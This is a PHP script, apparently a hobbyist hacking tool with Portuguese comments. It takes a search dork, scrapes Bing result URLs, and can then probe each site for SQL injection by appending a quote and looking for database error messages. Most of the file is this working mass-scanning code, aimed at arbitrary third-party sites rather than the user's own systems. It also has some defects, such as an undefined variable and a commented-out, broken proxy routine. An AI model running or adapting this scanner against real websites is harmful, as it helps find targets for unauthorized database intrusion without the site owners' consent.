<?php
	
	# Autor: Pablo Santhus
	# Titulo: 0xsec
	# Software Link: https://github.com/PabloSanthus/0x_Sec
	# Plataforma: PHP
	# Data: 25/12/16
	# Versao: 1.0
	# Testado em: [Kali linux 2.0 | Windows 7]

	error_reporting(0);
	set_time_limit(0);
	$dork = $argv[2] . " ". $argv[3];
	
	function banner(){
			echo "

   ___          _____                      _ _         
  / _ \        / ____|                    (_) |        
 | | | |_  __ | (___   ___  ___ _   _ _ __ _| |_ _   _ 
 | | | \ \/ /  \___ \ / _ \/ __| | | | '__| | __| | | |
 | |_| |>  <   ____) |  __/ (__| |_| | |  | | |_| |_| |
  \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                  __/ | 0.1
                                                 |___/ 
 [+] 0xsec_dork sql
 [+] Plataforma: php
 [+] Criado: Pablo Santhus
 [+] Dork: {$dork}
 [+] Facebook: https://www.facebook.com/pablosanthus
 [+] Ajuda: php 0xsec_dork.php -h\n

";}
	
	banner();

		$config['proxy'] = $argv[$a];
		$config['host'] = "https://www.bing.com/search?q=";
		$config['dork'] = urlencode($dork);
		$config['url'] = $config['host'] . $config['dork'];

// 	$a = 5;
// 	$p = 4;
// 	if($argv[4] == "-sql" or $argv[4] == "--sql"){
// 		$p = $p + 1;
// 		$a = $p + 1;
// 	}

// function proxy($pack, $config){
// 	if($argv[$p] == "--proxy" && isset($argv[$a])){
// 		$proxy 	= explode(":", $argv[$a]);
// 		$ip 	= $proxy[0];
// 		$porta 	= $proxy[1];

// 		$sock = fsockopen($ip, $porta);
// 		if(!$sock){
// 			echo "Este Proxy nao responde {$ip}:{$porta} tente outro";
// 		}else{
// 			$sock = fsockopen(gethostbyname($config['host'], $porta));
// 			if(!$sock){
// 				echo "Host nao responde {$config['host']} : {$porta}";
// 			}
// 		}

// 		fputs($sock, $pack);
// 		$buffer = NULL;
// 		while(!feof($sock)){
// 			$buffer.=fgets($ock);
// 		}
// 		fclose($sock);
//         return($buffer);
// 	}
//  }	

if($argv[1] == "-dork" or $argv[1] == "-d" && isset($argv[2]) ){
 
	if (isset($config['url'])) {

	$f = @fopen($config['url'],"r");
	$count = 1;
		while($buf = fgets($f,1024)){

		$buf = fgets($f, 4096);
		preg_match_all("#\b((((ht|f)tps?://)|(ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i",$buf,$words);
			for( $i = 0; $words[$i]; $i++ ){
				for( $j = 0; $words[$i][$j]; $j++ ){

						if (isset($words[$i][$j]) && !strstr($words[$i][$j], "google") && !strstr($words[$i][$j], "youtube") && !strstr($words[$i][$j], "orkut") && !strstr($words[$i][$j], "microsoft") && !strstr($words[$i][$j], "blogger") && !strstr($words[$i][$j], "live") && !strstr($words[$i][$j], "facebook") && !strstr($words[$i][$j], "bing")) {

							$urls = strtolower($words[$i][$j]);
							$urls = str_replace(array("http://", "https://", "ht", "cid-"), "", $words[$i][$j]);

						    if(!$urls == ""){
						    	print "[".$count."] " . "$urls\n";
						    	if($argv[4] == "--sql" or $argv[4] == "-sql"){
									$fp = fopen("urls.txt", "a");
									fwrite($fp, " ". $urls . "\n");
						    	}
						    }
					    	$count++;
					}
				}
			}
		}
	}


	if($argv[4] == "--sql" or $argv[4] == "-sql"){
		print "\n\n";
		echo " ---------------------------------------------------------------------------------\n\n";
		echo " [+] Iniciando Verificacao Sql Injection \n";sleep(1);
		echo " [+] Capturando Hosts\n";sleep(1);
		echo " [+] Hosts Capturados\n";sleep(1);
		echo " [+] Iniciando ...\n";sleep(1);
		echo " ---------------------------------------------------------------------------------\n\n";

		$file = file("urls.txt");

		$sites = str_replace(" ", "\n", $file);



		foreach($sites as $site){
			$site = str_replace("\n", "", $site);
			$site = str_replace("\r", "", $site);

			$caminho = "http://" .$site . "'";
			$error = file_get_contents($caminho);

			if(eregi("Warning", $error) or eregi("error", $error) or eregi("SQL syntax", $error) or eregi("MySQL", $error)){
				print "_______________________________________________________________________________\n\n";
				echo "[+] ". $site . " -->" . " Vulneravel :D \n";
				print "_______________________________________________________________________________\n\n";
			}else{
				echo "[-] ". $site ." -->" . " NOT Vulneravel :( \n";				
			}
		}
			$fp = fopen("urls.txt", "w");
			fwrite($fp, "");
			fclose($fp);
	}

}else{
	echo "\n\n Ajuda: 0xsec_dork.php -h \n\n";
}

if($argv[1] == "-h" or $argv[1] == "-help"){
	echo "
	options[-d, -sql, -h]  

	*----------------------------------------------------*
	# -d    |  Atribui uma dork                          #
	# -sql  |  Verifica Vulnerabilidade em sql injection #
	# -h    |  Exibe menu de Ajuda                       #
	*----------------------------------------------------*

	exemplos:

	0xsec_dork.php -d inurl:news.php?id= 
	0xsec_dork.php -d inurl:news.php?id= -sql

	";
}

?>
